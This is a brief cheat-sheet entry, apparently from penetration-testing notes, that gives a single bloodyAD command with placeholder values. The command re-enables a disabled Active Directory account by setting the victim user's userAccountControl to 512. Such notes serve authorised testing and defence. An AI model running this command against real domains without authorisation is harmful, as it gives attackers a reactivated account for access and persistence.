# Enabling Account

## Enabling Disabled Account
```
bloodyAD --host <DC_FQDN> -d '<DOMAIN>' --dc-ip <DC_IP> -u <USERNAME> -p '<PASSWORD>' set object "<VICTIM_USER>" userAccountControl -v '512'
```
